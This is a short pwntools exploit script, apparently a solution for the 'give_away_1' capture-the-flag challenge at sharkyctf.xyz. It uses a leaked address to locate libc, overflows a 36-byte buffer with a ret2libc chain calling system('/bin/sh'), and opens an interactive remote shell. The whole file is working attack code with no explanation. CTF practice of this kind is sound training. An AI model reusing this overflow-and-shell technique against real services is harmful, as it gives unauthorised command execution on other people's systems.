from pwn import *

payload = "A"*36

debug = False

if debug:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    p = process('./give_away_1')
else:
    libc = ELF('libc-2.27.so') 
    p = remote('sharkyctf.xyz', 20334)


a = p.recvline()
libc.address = int(a.split()[2], 16)-libc.sym['system']
binsh = libc.search('/bin/sh').next()
system = libc.sym['system']
exit = libc.sym['exit']
payload+=p32(system)+p32(exit)+p32(binsh)
print 'system: ', hex(system)
print 'exit: ', hex(exit)
print '/bin/sh: ', hex(binsh)
p.sendline(payload)
p.interactive()
